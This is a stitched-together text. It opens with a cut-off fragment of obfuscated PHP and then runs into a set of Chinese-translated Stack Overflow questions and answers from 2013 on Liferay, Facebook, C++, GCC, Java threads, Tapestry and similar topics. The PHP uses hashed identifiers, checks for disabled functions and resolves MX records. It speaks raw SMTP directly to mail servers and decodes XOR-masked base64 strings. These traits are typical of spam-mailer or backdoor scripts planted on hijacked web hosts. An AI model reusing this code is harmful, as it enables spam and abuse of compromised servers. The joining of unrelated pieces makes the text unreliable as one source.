    return preg_match("/^([1-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])(\.([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])){3}$/", $v957b527b);
}
function na73fa8bd($vb45cffe0, $v11a95b8a = 0, $v7fa1b685 = "=\r\n", $v92f21a0f = 0, $v3303c65a = false)
{
    $vf5a8e923 = strlen($vb45cffe0);
    $vb4a88417 = '';
    for ($v865c0c0b = 0; $v865c0c0b < $vf5a8e923; $v865c0c0b++) {
        if ($v11a95b8a >= 75) {
            $v11a95b8a = $v92f21a0f;
            $vb4a88417 .= $v7fa1b685;
        }
        $v4a8a08f0 = ord($vb45cffe0[$v865c0c0b]);
        if (($v4a8a08f0 == 0x3d) || ($v4a8a08f0 >= 0x80) || ($v4a8a08f0 < 0x20)) {
            if ((($v4a8a08f0 == 0x0A) || ($v4a8a08f0 == 0x0D)) && (!$v3303c65a)) {
                $vb4a88417 .= chr($v4a8a08f0);
                $v11a95b8a = 0;
                continue;
            }
            $vb4a88417 .= '=' . str_pad(strtoupper(dechex($v4a8a08f0)), 2, '0', STR_PAD_LEFT);
            $v11a95b8a += 3;
            continue;
        }
        $vb4a88417 .= chr($v4a8a08f0);
        $v11a95b8a++;
    }
    return $vb4a88417;
}
function n7b0ecdff($vd98a07f8, $v01b6e203, $v841a2d68, $v0897acf4, $v3d26b0b1)
{
    global $v619d75f8;
    if (!in_array('fsockopen', $v619d75f8))
        $v66b18866 = @fsockopen($v3d26b0b1, 25, $v70106d0d, $v809b1abe, 20);
    elseif (!in_array('pfsockopen', $v619d75f8))
        $v66b18866 = @pfsockopen($v3d26b0b1, 25, $v70106d0d, $v809b1abe, 20);
    elseif (!in_array('stream_socket_client', $v619d75f8) && function_exists("stream_socket_client"))
        $v66b18866 = @stream_socket_client("tcp://$v3d26b0b1:25", $v70106d0d, $v809b1abe, 20);
    else
        return -1;
    if (!$v66b18866) {
        return 1;
    } else {
        $v8d777f38 = n54070395($v66b18866);
        @fputs($v66b18866, "EHLO $v0897acf4\r\n");
        $ve98d2f00 = n54070395($v66b18866);
        if (substr($ve98d2f00, 0, 3) != 250)
            return "2+($v01b6e203)+" . preg_replace('/(\r\n|\r|\n)/', '|', $ve98d2f00);
        @fputs($v66b18866, "MAIL FROM:<$vd98a07f8>\r\n");
        $ve98d2f00 = n54070395($v66b18866);
        if (substr($ve98d2f00, 0, 3) != 250)
            return "3+($v01b6e203)+" . preg_replace('/(\r\n|\r|\n)/', '|', $ve98d2f00);
        @fputs($v66b18866, "RCPT TO:<$v01b6e203>\r\n");
        $ve98d2f00 = n54070395($v66b18866);
        if (substr($ve98d2f00, 0, 3) != 250 && substr($ve98d2f00, 0, 3) != 251)
            return "4+($v01b6e203)+" . preg_replace('/(\r\n|\r|\n)/', '|', $ve98d2f00);
        @fputs($v66b18866, "DATA\r\n");
        $ve98d2f00 = n54070395($v66b18866);
        if (substr($ve98d2f00, 0, 3) != 354)
            return "5+($v01b6e203)+" . preg_replace('/(\r\n|\r|\n)/', '|', $ve98d2f00);
        @fputs($v66b18866, $v841a2d68 . "\r\n.\r\n");
        $ve98d2f00 = n54070395($v66b18866);
        if (substr($ve98d2f00, 0, 3) != 250)
            return "6+($v01b6e203)+" . preg_replace('/(\r\n|\r|\n)/', '|', $ve98d2f00);
        @fputs($v66b18866, "QUIT\r\n");
        @fclose($v66b18866);
        return 0;
    }
}
function n54070395($v66b18866)
{
    $v8d777f38 = '';
    while ($v341be97d = @fgets($v66b18866, 4096)) {
        $v8d777f38 .= $v341be97d;
        if (substr($v341be97d, 3, 1) == ' ')
            break;
    }
    return $v8d777f38;
}
function n9c812bad($vad5f82e8)
{
    global $v619d75f8;
    if (!in_array('getmxrr', $v619d75f8) && function_exists("getmxrr")) {
        @getmxrr($vad5f82e8, $v744fa43b, $v6c5ea816);
        if (count($v744fa43b) === 0)
            return '127.0.0.1';
        $v865c0c0b = array_keys($v6c5ea816, min($v6c5ea816));
        return $v744fa43b[$v865c0c0b[0]];
    } else {
        return '127.0.0.1';
    }
}
function n9a2d8ce3($v1cb251ec)
{
    $v1cb251ec = base64_decode($v1cb251ec);
    $vc68271a6 = '';
    for ($v865c0c0b = 0; $v865c0c0b < strlen($v1cb251ec); $v865c0c0b++)
        $vc68271a6 .= chr(ord($v1cb251ec[$v865c0c0b]) ^ 2);
    return $vc68271a6;
}
?> 
```

# liferay-6 - 如何使用 liferay 标签

> ID：14379623
> 
> 赞同：0
> 
> 时间：2013-01-17T12:55:14.343
> 
> 标签：liferay-6

我需要开发一个简单的普通登录页面，没有任何图像和所有图像。一旦用户登录，它应该显示如下链接中的图像。

```
http://www.liferay.com/community/wiki/-/wiki/Main/Creating+Tabs+in+Liferay+Portlets 
```

示例 Tab1、示例 Tab2、示例 Tab3 我可以使用 liferay 选项卡来实现。但是我怎样才能获得 HomeA1、报告选项卡。首先我什至没有获得登录页面。我对这个 liferay 很生气。但这是任务让我完成。请任何帮助将不胜感激。对不起我的英语不好。

谢谢你

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T15:54:09.067

既然您已经设法显示“Sample Tab1,Sample Tab2,Sample Tab3”，那就去替换

```
String tabNames = "Sample Tab 1,Sample Tab 2,Sample Tab 3"; 
```

和

```
String tabNames = "HomeA1,Reports tabs,Whatever-you-like"; 
```

您给我们的链接涵盖了这一部分。我真的认为你可以更仔细地阅读它。如果你一直有问题，你应该提供一些代码或错误日志

# php - 向每个在 facebook 上喜欢“粉丝门”的人显示唯一代码

> ID：14379624
> 
> 赞同：2
> 
> 时间：2013-01-17T12:55:15.080
> 
> 标签：php, facebook

我正在考虑向在 facebook fangate 页面上点击喜欢的每个人显示一个唯一代码的想法，该代码将用于在 facebook 之外兑换的凭证，并且每个人必须是唯一的。

当用户喜欢该标签时，我已经了解了内容，我希望做的是根据数据库检查该人的 Facebook ID，然后如果他们还没有获得代码，则分配他们的用户 ID到代码并显示代码。

我想我要问的真正问题是，一旦他们在应用程序选项卡中单击，我可以获得用户的唯一 Facebook ID 吗？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T13:00:15.457

简短的回答：不

但是您可以要求基本权限。此外，使用 fangate 作为参与的唯一限制是违反 facebook 规则的。您可以实现以下用户旅程：

1.  扇门

2.  一旦用户喜欢您的页面，请提供一个“获取您的代码”按钮

3.  单击按钮后，请求基本权限。

4.  在重定向获取用户 ID 后，如果他已经获得了代码，请对照 DB 检查它。

5.  如果以上为假，则将用户 ID 写入表中。

6.  获取用户代码并显示它。

这样，如果用户丢失了代码，您将能够再次查看代码。

# c# - 在 Win Forms 中模拟 WebBrowser 控件上的复制粘贴

> ID：14379625
> 
> 赞同：4
> 
> 时间：2013-01-17T12:55:16.943
> 
> 标签：c#, winforms, webbrowser-control

我有一个带有文本数据的表单中的 WebBrowser 控件，并且在该表单中我引入了 2 个按钮。一种是复制全部内容（CTRL+A、CTRL+C），另一种是只复制选定的（使用鼠标）文本，即只复制一个 CTRL+C，然后将其粘贴到记事本中。

复制代码：（这部分正确。仅复制到某个点）

```
this.WebBrowser.Document.Focus();
SendKeys.SendWait("^a");
SendKeys.SendWait("^a^c");
this.WebBrowser.Refresh(); 
```

所选副本的代码：（这根本不起作用）

```
this.WebBrowser.Document.Focus();
SendKeys.SendWait("^c");
this.WebBrowser.Refresh(); 
```

你能告诉我这是否是正确的方法吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-01-17T13:02:58.427

试试这个复制：

```
this.WebBrowser.Document.ExecCommand("Copy", False, vbNull) 
```

或者使用属性 WebBrowser.IsWebBrowserContextMenuEnabled = True。这将启用控件中的上下文菜单，您可以从中复制/粘贴。

# php - Magento PDF上的日文字符

> ID：14379626
> 
> 赞同：0
> 
> 时间：2013-01-17T12:55:22.983
> 
> 标签：php, magento, pdf, fonts

我在 Magento 收到了几张地址中有日文字符的发票。当我打印发票时，这些字符打印不正确。

我通过在 abstract.php 中将字体更改为 Arial Unicode 来解决这个问题。问题是这使得发票文件很大（超过 10mb）。

我可以使用另一种可以正确显示日文和英文字符的小字体吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T13:03:40.157

请使用字体`cid0jp`，它可能可以解决您的问题。

# c++ - 具有默认参数的重载构造函数

> ID：14379628
> 
> 赞同：3
> 
> 时间：2013-01-17T12:55:28.893
> 
> 标签：c++

我有两个像这样重载的构造函数，问题是输入了错误的构造函数重载：

```
class Param
{ 
    Param(
     const std::string& name,
     const MyVariant& variant = MyVariant()
     const std::string& desc = std::string(""),
     bool b1 = true,
     bool b2 = true )
     :
     mName(name),
     mValue(variant),
     mDesc(desc),
     mB1(b1),
     mB2(b2) {}

     Param( 
      const std::string& name,
      const MyVariant& variant,
      bool b1)
      :
      mName(name),
      mValue(variant)
      mB1(b1) {}

   private:
      std::string mName;
      MyVariant mValue;
      std::string mDesc;
      bool mB1;
      bool mB2;
};

 Param p("name",4,"desc"); // this enters the second constructor, not the first why ? 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-17T12:58:22.417

它使用第二个构造函数，因为`"desc"`is a`const char*`可以`bool`隐式转换为 a，所以这就是编译器所做的。没有从`const char*`to的隐式转换`std::string`，所以第一个构造函数在这里甚至不是候选对象。

要使用第一个构造函数，您需要显式传入 a `string`：

```
Param p("name",4,std::string("desc")); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T13:00:10.730

编译器更喜欢将字符串文字 , 的类型转换`"desc"`为 a `const char*`，然后再转换为 a `bool`，而不是调用 的转换构造函数`std::string`。您可以通过执行以下操作确保调用第一个构造函数：

```
Param p("name",4,std::string("desc")); 
```

# file - .bat 文件以搜索 pst 文件

> ID：14379629
> 
> 赞同：-1
> 
> 时间：2013-01-17T12:55:30.163
> 
> 标签：file, batch-file, find, pst

任何人都可以帮助我处理一个（尽可能简单的）批处理文件，我可以在用户个人资料上释放以搜索 PST 文件。我需要查看找到的任何 PST 文件的位置。

谢谢大家

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T13:28:43.307

尽可能简单:)

```
dir C:\*.pst /s /b 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T13:30:34.517

变量 %USERPROFILE% 给出当前登录用户的配置文件目录。您可以使用 DIR 命令以递归方式列出所有 *.PST 文件。最简单的脚本是

```
ECHO using directory %USERPROFILE%

DIR /B /P /S %USERPROFILE%\*.PST 
```

您可以更改 DIR 命令的开关以格式化输出。

# android - 如何在 cakephp 中为 Web 服务发布请求提供身份验证

> ID：14379640
> 
> 赞同：0
> 
> 时间：2013-01-17T12:56:10.027
> 
> 标签：android, rest, cakephp, authentication, restful-authentication

我正在使用 cakePhp 开发网站。我使用 cake 中的 Auth 组件以及用户/权限的 Acl 组件。在网络端一切正常。我现在想从另一台设备（Android）手机调用一些控制器的操作，并且我想为密码提供某种安全性。所以我的问题是：

1 - 如何保护或加密Android客户端中的密码，以便我可以在蛋糕中解密（任何众所周知的或标准？）

2- 在 cakebackend 中，我如何以及在哪里可以使用解密的密码来允许基于用户凭据的用户响应

非常感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T15:46:09.107

1) 使用 https

2）您想要的是无状态身份验证。

*   [http://appsandsecurity.blogspot.de/2011/04/rest-and-stateless-session-ids.html](http://appsandsecurity.blogspot.de/2011/04/rest-and-stateless-session-ids.html)
*   [如何实现无状态的 REST API](https://stackoverflow.com/questions/3864761/how-to-implement-a-stateless-rest-api)

如果您搜索“无状态身份验证”和许多示例脚本，在线有大量资源。

# ios - 如何在 ios 中使用 JSONKit 解析这个 JSON

> ID：14379647
> 
> 赞同：0
> 
> 时间：2013-01-17T12:56:39.940
> 
> 标签：ios, jsonkit

> **可能重复：**
> [如何使用 Objective-C 解析 JSON？](https://stackoverflow.com/questions/5547311/how-do-i-parse-json-with-objective-c)

我正在从服务器下载这个 Json 数据。请帮我正确解析这些数据。

```
{
    "query": {
        "id": 57,
        "uuid": "F247AE9F35014F7D82354FDC17C3F54C",
        "owner": "27",
        "url": "http://www.google.com",
        "urldata": {
            "name1": "http://www.orkut.com",
            "name2": "http://www.friendster.com",
            "name3": "http://www.facebook.com",
        }
    }
} 
```

提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T13:02:00.763

如果您使用的是 iOS 5 或更高版本，您可以使用[**NSJSONSerialization**](http://developer.apple.com/library/ios/#documentation/Foundation/Reference/NSJSONSerialization_Class/Reference/Reference.html)类来执行此操作：

```
NSError* error;
NSDictionary *jsonData = [NSJSONSerialization JSONObjectWithData:yourData options:kNilOptions error:&error]; 
```

如果您使用低于 iOS 5 的版本，请检查[**SBJSON**](http://stig.github.com/json-framework/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T12:59:55.690

你试过什么？

但是阅读这篇文章 - 让您比直接获得答案有更好的理解:)

[http://www.raywenderlich.com/5492/working-with-json-in-ios-5](http://www.raywenderlich.com/5492/working-with-json-in-ios-5)

# database - 如何获取在 Sonar 中引入违规的用户的详细信息？

> ID：14379653
> 
> 赞同：1
> 
> 时间：2013-01-17T12:57:12.070
> 
> 标签：database, sonarqube

我正在使用声纳来捕获违规并跟踪谁引入了错误，我们使用 SCM 插件。

我每晚运行声纳，我的目标是找出引入的新违规的详细信息以及是谁引入的。此外，已解决的违规行为。

我怎样才能实现它？

[http://docs.codehaus.org/pages/viewpage.action?pageId=229743298](http://docs.codehaus.org/pages/viewpage.action?pageId=229743298) 这个 WEB API 会给我文件，但不会提供有关谁介绍它的详细信息，因为我从插件中获取此信息。

是否可以从声纳数据库中提取此信息。？

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T13:59:46.663

“违规”Web 服务目前不返回您正在寻找的信息，因为违规与开发人员无关。这有一个很好的理由：与检测到违规的行相关联的开发人员 SCM 登录不一定是引入此违规的人……因此，Sonar 目前无法确定是谁引入了违规。

要回答您的问题，如果您真的想通过 Web 服务 API 获取有关文件的 SCM 信息，您应该使用“资源”网络服务，而不是“违规”服务。例如：

`http://my.sonar.server/api/resources?metrics=authors_by_line&resource=my-project-key:my-file-key`

但同样，IMO，通过将违规与基本 SCM 信息相关联，您并没有以正确的方式做事。

# c++ - 简单的模型加载器问题

> ID：14379654
> 
> 赞同：0
> 
> 时间：2013-01-17T12:57:22.703
> 
> 标签：c++, opengl

我们一直在创建一个非常基本的模型加载器。代码本身如下；主要问题是当字符串流检测到“f”作为第一个字符时。为了调试，代码被过度简化（一开始有点复杂）。目前， cout << ind3; 给出 0。它应该读取 2 或 5，具体取决于阅读器所在的行。这两个向量参数用于写入以进行绘图，但此时我已删除此操作。

两个“f”行是： f 0 1 2 f 3 4 5

该程序可以很好地读取 v （顶点）行；它不会在 f 行中读取。

```
bool modelLoader(string fileName,vector<GLfloat>& vertices, vector<GLushort>& indices)
{
vector<GLfloat> localVertices;
ifstream objFile;
string line,testline;
stringstream ss;

GLfloat x, y, z;
//GLushort ind1, ind2, ind3; Excluded for testing
int ind1=0, ind2=0, ind3=0; 
objFile.open(fileName);
if (!objFile.is_open())
{
    cout << "FAILED TO LOAD: OBJ FILE\n";

    return false;
}

while ( objFile.good() )
{
    getline(objFile, line);
    ss.str(line);

    if (line == "")
    {
        continue;
    }

    else if(line[0] == 'v')
    {
        ss.ignore(2);
        ss >> x >> y >> z;
        localVertices.push_back(x);
        localVertices.push_back(y);
        localVertices.push_back(z);
    }

    else if (line[0] == 'f')
    {
        cout<<ss.str()<<endl; // for debug
        ss.ignore(6); // To skip 'f 0 1 ' and get purely a 2\. Was originally
                    // set to ss.ignore(2) when reading in all 3 values.
        cout<<ss.str()<<endl; // for debug
        ss >> ind3;
        cout << ind3 << endl; 
    }
}
objFile.close();
cout << "Reader success.\n";
return true;
} 
```

有谁知道为什么这三个 inds 被读为平 0？也不是我已经将它们初始化为 0 - 在它们都根据使用的类型读取一个大的负数之前，这并不能说明太多。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T13:13:41.873

字符串流可能设置了错误标志 (EOF)，这将阻止格式化输入。在流上调用 str() 不会重置标志。

调用 str() 后，调用 clear() 清除标志。

# java - 可以并行执行 Java Object 非同步方法的最大线程数是多少？

> ID：14379656
> 
> 赞同：3
> 
> 时间：2013-01-17T12:57:28.320
> 
> 标签：java, multithreading

有最大值吗？可能是因为底层操作系统确实只允许每个进程有“X”个线程等？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-17T12:59:55.037

这取决于您使用的 CPU、操作系统、其他进程正在执行的操作、您使用的 Java 版本以及其他因素。在关闭机器之前，我已经看到 Windows 服务器有 > 6500 个线程。当然，大多数线程都没有做任何事情。一旦机器达到大约 6500 线程（Java 中），整台机器就开始出现问题并变得不稳定。

我的经验表明，Java（最新版本）可以愉快地使用计算机本身可以承载的尽可能多的线程，而不会出现问题。

当然，您必须有足够的 RAM，并且您必须以足够的内存启动 Java，以完成线程正在执行的所有操作，并为每个线程拥有一个堆栈。任何具有现代 CPU（最近几代 AMD 或 Intel）和 1 - 2 Gig 内存（取决于操作系统）的机器都可以轻松支持具有数千个线程的 JVM。

如果您需要比这更具体的答案，最好的办法是进行分析。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-17T13:04:46.093

总是有一些最大值，但它是什么以及它是如何确定的却千差万别。除其他外，该限制可以由 JVM 上的总内存分配池限制或显式操作系统级别限制隐式施加。绕过内存限制的一种方法是使用较小的堆栈大小配置 JVM。

请参阅[此答案](https://stackoverflow.com/questions/344203/maximum-number-of-threads-per-process-in-linux)以了解如何在 Linux 上确定限制。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-01-17T13:06:09.567

在 Linux 上，我最多看到了 ~32000，之后它无法创建新线程。如果您有 CPU 密集型任务，则最佳线程数可能是您拥有的 CPU 数，因此拥有这样的数字通常不是一个好主意。

# c# - 测试 C# dll 的最简单方法

> ID：14379657
> 
> 赞同：0
> 
> 时间：2013-01-17T12:57:32.330
> 
> 标签：c#

我有一个类库类型的 C# dll，它开发为由第三方 Quartz 应用程序调用。

这个 C# dll 创建一个文件，我想在不使用 Quartz 的情况下测试创建文件。对最简单的方法有什么建议吗？

我尝试创建一个控制台应用程序并调用了 dll，但该 dll 使用了许多其他 dll，并且每当此 dll 调用其他 dll 时，我都会收到烦人的（空引用）错误

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-17T13:00:42.263

我认为您很难在没有任何依赖关系的情况下直接测试 DLL。作为替代方案，我建议您改为使用[Unit Testing](http://en.wikipedia.org/wiki/Unit_testing)对代码运行隔离测试。

我建议您看一下这个关于使用 Visual Studio 进行单元测试的介绍。[http://www.codeproject.com/Articles/391465/Creating-Uni​​t-tests-for-your-csharp-code](http://www.codeproject.com/Articles/391465/Creating-Unit-tests-for-your-csharp-code)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T13:00:47.207

您应该开发一个[单元测试](http://en.wikipedia.org/wiki/Unit_testing)项目。但是，您必须[模拟/存根](https://stackoverflow.com/q/463707/296526)您的类库使用的依赖项。为了有效地做到这一点，您需要“设计”您的类库以便于测试。

对于好的建议，我可以推荐Roy Osherove[的《单元测试的艺术》一书。](http://artofunittesting.com/)

您可以尝试 MStest（VS 附带的某些版本）或[Nunit](http://www.nunit.org/)。

但是，如果您使用的是遗留代码或难以测试的代码，特殊的框架可以帮助您注入外部 DLL 等依赖项。一个例子是[Typemock](http://www.typemock.com/)

# linux - x86_64 平台上的 gcc i686

> ID：14379660
> 
> 赞同：3
> 
> 时间：2013-01-17T12:57:40.587
> 
> 标签：linux, gcc, redhat

我在 RHEL X86_64 上安装 GCC i686 时遇到了一些麻烦。确实，我必须在这个平台上构建一些 32 位软件和共享库。我可以在 32 位平台（linux 或 windows）上构建这些软件和库。

我的问题在这篇文章的末尾。

我的第一个问题是这个错误：（在构建期间，在 eclipse -helios 下）

```
In file included from /usr/include/stdlib.h:314,
                  from ../../../../../XXXX.h:19,
                  from /XXXX.c:33: 
/usr/include/sys/types.h:150: error: duplicate 'unsigned' 
/usr/include/sys/types.h:151: error: duplicate 'unsigned' 
/usr/include/sys/types.h:151: error: duplicate 'short' 
/usr/include/sys/types.h:152: error: duplicate 'unsigned' 
/usr/include/sys/types.h:152: error: two or more data types in declaration specifiers 
make: *** [XXXX.o] Error 1 
```

为了纠正这个错误，我不得不将 stdlib.h 包含在所有其他文件之前，但是我有很多文件，有时这个技巧无论如何都不起作用。此外，我不应该修改源文件。

当我使用朋友提供的 makefile 来构建共​​享库时，我遇到了完全相同的问题。这个makefile在他的平台上运行良好（和我一样，RHEL 4.4.6 x86_64）。

他告诉我出现错误是因为我使用 X86_64 库来构建 32 位软件（或共享库）。

这是我的 GCC 版本：

```
GCC version

[root@localhost bin]# gcc -v
Target: x86_64-redhat-linux
Configured with: ../configure --prefix=/usr 
--mandir=/usr/share/man 
--infodir=/usr/share/info 
--with-bugurl=http://bugzilla.redhat.com/bugzilla 
--enable-bootstrap 
--enable-shared 
--enable-threads=posix 
--enable-checking=release 
--with-system-zlib 
--enable-__cxa_atexit 
--disable-libunwind-exceptions 
--enable-gnu-unique-object 
--enable-languages=c,c++,objc,obj-c++,java,fortran,ada 
--enable-java-awt=gtk 
--disable-dssi 
--with-java-home=/usr/lib/jvm/java-1.5.0-gcj-1.5.0.0/jre 
--enable-libgcj-multifile 
--enable-java-maintainer-mode 
--with-ecj-jar=/usr/share/java/eclipse-ecj.jar 
--disable-libjava-multilib 
--with-ppl 
--with-cloog 
--with-tune=generic 
--with-arch_32=i686 
--build=x86_64-redhat-linux
thread: posix
gcc version 4.4.6 20110731 (Red Hat 4.4.6-3) (GCC) 

[root@localhost bin]# rpm -qa |grep gcc
gcc-c++-4.4.6-3.el6.x86_64
gcc-4.4.6-3.el6.x86_64
gcc-gfortran-4.4.6-3.el6.x86_64 
```

所以首先，我从 RHEL DVD 安装程序中安装了 glibc.i686 和 libgcc.i686 包。我现在有：

```
Installed packages (from redhat DVD)
[root@localhost bin]# rpm -qa |grep glibc
glibc-common-2.12-1.47.el6.x86_64
glibc-2.12-1.47.el6.x86_64
glibc-devel-2.12-1.47.el6.x86_64
glibc-devel-2.12-1.47.el6.i686
glibc-headers-2.12-1.47.el6.x86_64
glibc-2.12-1.47.el6.i686

[root@localhost bin]# rpm -qa |grep libgcc
libgcc-4.4.6-3.el6.x86_64
libgcc-4.4.6-3.el6.i686 
```

由于 GCC 是 x86_64，我阅读了一些关于交叉编译的文档，尤其是这个： [wiki.osdev.org/GCC_Criss-Compiler](http://wiki.osdev.org/GCC_Cross-Compiler)

于是我下载了：gcc-4.4.6.tar.gz、binutils-2.23.tar.gz、gmp-5.0.2.tar.gz、mpfr-3.1.1.tar.gz。我将目录 gmp-5.0.2 和 mpfr-3.1.1 放在 gcc-4.4.6 目录中（我将 gmp-5.0.2 重命名为 gmp，将 mpfr-3.1.1 重命名为 mpfr）。

我按照 wiki.osdev 的说明进行操作，即：

```
export PREFIX=/usr/local/cross
export TARGET=i686-elf
cd /usr/src
mkdir build-binutils build-gcc
cd /usr/src/build-binutils
../binutils-x.xx/configure --target=$TARGET --prefix=$PREFIX --disable-nls
make all
make install
cd /usr/src/build-gcc
export PATH=$PATH:$PREFIX/bin
../gcc-x.x.x/configure --target=$TARGET --prefix=$PREFIX --disable-nls \
    --enable-languages=c,c++ --without-headers
make all-gcc
make install-gcc 
```

*   ' **make all** ' 和 ' **make install** ' for binutils => OK
*   '**制作所有 gcc** '

--> 第一个错误：“real.h”中缺少“mpfr.h”。所以我在 gcc-4.4.6/gcc 中添加了 mpfr.h 就可以了（也许实际上不是......）

--> 第二个错误（现在唯一一个）：

```
[...]
gcc  -g -O2 -DIN_GCC -DCROSS_DIRECTORY_STRUCTURE  -W -Wall 
-Wwrite-strings 
-Wstrict-prototypes 
-Wmissing-prototypes 
-Wcast-qual 
-Wold-style-definition 
-Wc++-compat 
-Wmissing-format-attribute 
-pedantic 
-Wno-long-long 
-Wno-variadic-macros 
-Wno-overlength-strings   
-DHAVE_CONFIG_H  
-o cc1-dummy c-lang.o stub-objc.o attribs.o c-errors.o c-lex.o c-pragma.o c-decl.o 
c-typeck.o c-convert.o c-aux-info.o c-common.o c-opts.o c-format.o c-semantics.o 
c-ppoutput.o c-cppbuiltin.o c-objc-common.o c-dump.o c-pch.o c-parser.o i386-c.o 
c-gimplify.o tree-mudflap.o c-pretty-print.o c-omp.o dummy-checksum.o \
              main.o  libbackend.a ../libcpp/libcpp.a ../libdecnumber/libdecnumber.a ../libcpp/libcpp.a   ../libiberty/libiberty.a ../libdecnumber/libdecnumber.a   
-L/usr/src/build-gcc/./gmp/.libs -L/usr/src/build-gcc/./gmp/_libs 
-L/usr/src/build-gcc/./mpfr/.libs -L/usr/src/build-gcc/./mpfr/_libs 
-lmpfr -lgmp
**/usr/bin/ld: cannot find -lmpfr
collect2: ld returned 1 exit status
make[1]: *** [cc1-dummy] Error 1
make[1]: Leaving directory `/usr/src/build-gcc/gcc'
make: *** [all-gcc] Error 2** 
```

**最后，我的问题是：

*   这种交叉编译可以解决我的问题吗？

*   解决缺少 ld mpfr 问题的好方法是什么？**

在发帖之前我做了很多研究。我的 linux 知识目前还不是很好。

预先感谢您的帮助。

* * *

****编辑＃1：****

 **我已经尝试过 -m32 标志，但问题仍然存在。

例如，如果我运行一个 makefile：

```
[root@localhost makefile]# make -f sharedLib.mak
gcc -m32 -march=i686 -O2  -Wall -I ../../sharedLib/inc/ -o XXX.o -c ../src/XXX.c
In file included from /usr/include/stdlib.h:314,
                 from ../src/XXX.c:51:
/usr/include/sys/types.h:150: error: duplicate 'unsigned'
/usr/include/sys/types.h:151: error: duplicate 'unsigned'
/usr/include/sys/types.h:151: error: duplicate 'short'
/usr/include/sys/types.h:152: error: duplicate 'unsigned'
/usr/include/sys/types.h:152: error: two or more data types in declaration specifiers
make: *** [XXX.o] Error 1 
```

这是XXX.c：

```
#include "alphabet.h"
#include "outils.h"
#include "erreur.h"
#include <string.h>
#include <stdlib.h> (line 51 error) 
```

如果这样修改：

```
#include <stdlib.h>
#include "alphabet.h"
#include "outils.h"
#include "erreur.h"
#include <string.h> 
```

XXX.c 一切正常，但下一个源文件出现错误...

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-17T13:19:20.667

不需要编译 32 位版本的 GCC；只需提供`-m32`标志以使用 64 位版本的 GCC 生成 32 位代码（[常见问题解答条目](http://www.divms.uiowa.edu/help/linux/rh_amd64_faq.html#q6)）。

这个问题支持这一点：[How to compile glibc 32bit on an x​​86_64 machine](https://stackoverflow.com/questions/8004241/how-to-compile-glibc-32bit-on-an-x86-64-machine)

请注意，您可能必须安装 32 位版本并开发要编译的代码的所有依赖项的软件包（即 linux 头文件、glibc、...）

**编辑**要调试这样的问题，查看 GCC 尝试编译的源代码通常很有用。为此，请使用`gcc -E`而不是`gcc -c`. 这将为您提供预处理的 C 源代码以及许多`#line`语句，这些语句告诉 GCC 正在读取什么文件以产生以下内容。

创建这样一个文件并检查它。上面的错误让我想知道您是否创建了一个预处理器宏，该宏扩展为`stdlib.h`.**

# css - Twitter Bootstrap：根据视口大小切换类？

> ID：14379661
> 
> 赞同：0
> 
> 时间：2013-01-17T12:57:45.780
> 
> 标签：css, twitter-bootstrap, responsive-design

假设我有以下标记：

```
<div class="span6"></div>
<div class="span6"></div> 
```

现在假设如果视口小于 600px，我想让 DIV 跨越整个容器，如下所示：

```
<div class="span12"></div>
<div class="span12"></div> 
```

我的解决方案如下：

```
<div class="do-not-display-below-600px">
    <div class="span6"></div>
    <div class="span6"></div>
</div>

<div class="do-not-display-above-600px">
    <div class="span12"></div>
    <div class="span12"></div>
</div> 
```

并且只需`do-not-display...`使用媒体查询隐藏或显示类。

这是一个可怕的解决方案，因为它违反了“不要重复自己”的规则。假设我有 5 个断点，我必须为每个断点创建 5 个不同的容器。太丑了

所以我想知道是否有更优雅的解决方案？

PS：我意识到我可以使用 Bootstrap 的 LESS 混音器或 bootstrap-sass`@include`将混音器添加到我需要它们的每个类中，但是还有其他解决方案吗？

# java - Tapestry：使用@Startup 和@Order 注解的启动顺序

> ID：14379664
> 
> 赞同：0
> 
> 时间：2013-01-17T12:57:55.813
> 
> 标签：java, tapestry

`AppModule`在`Tapestry`项目中考虑一些。

我想订购必须在系统启动时调用的操作序列。

考虑一下，我有两个简单的动作：

1）行动，必须先行：

```
@Startup
public static void initMyApplication(Logger logger, LiquibaseService liquibaseService) {
    logger.info("Updating database by liquibase service...");
    liquibaseService.update();
    logger.info("update-db done.");
} 
```

2）和第二个：

```
@Startup
@Order("after:LiquibaseService")
public static void doSomeChecks(HibernateSessionManager hsm) {
   ... 
} 
```

我无法理解（即使在阅读文档之后）：**如何使用`@Order`注释指定此类操作的顺序？**

更具体地说：我需要指出`@Order("after:<HERE>)`什么？

看起来，这样的结构：

`@Order("after:LiquibaseService")`

或者

`@Order("after:initMyApplication")`

不工作。实际上我的`startup`动作是按任意顺序调用的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T13:57:31.107

我不认为`@Order`can be used`@Startup`但你可以做的是 use `contributeRegistryStartup`。正如它所期望的那样，`OrderedConfiguration`您可以订购您的贡献。

```
public class MyModule1
{
  public static void contributeRegistryStartup(OrderedConfiguration<Runnable> configuration)
  {
    configuration.add("MyFirstContribution", new Runnable() { ... });
  }
}

public class MyModule2
{
  public static void contributeRegistryStartup(OrderedConfiguration<Runnable> configuration)
  {
    configuration.add("MySecondContribution", new Runnable() { ... }, "after:MyFirstContribution");
  }
} 
```

# android - 安装更高版本的 apk 时解析错误

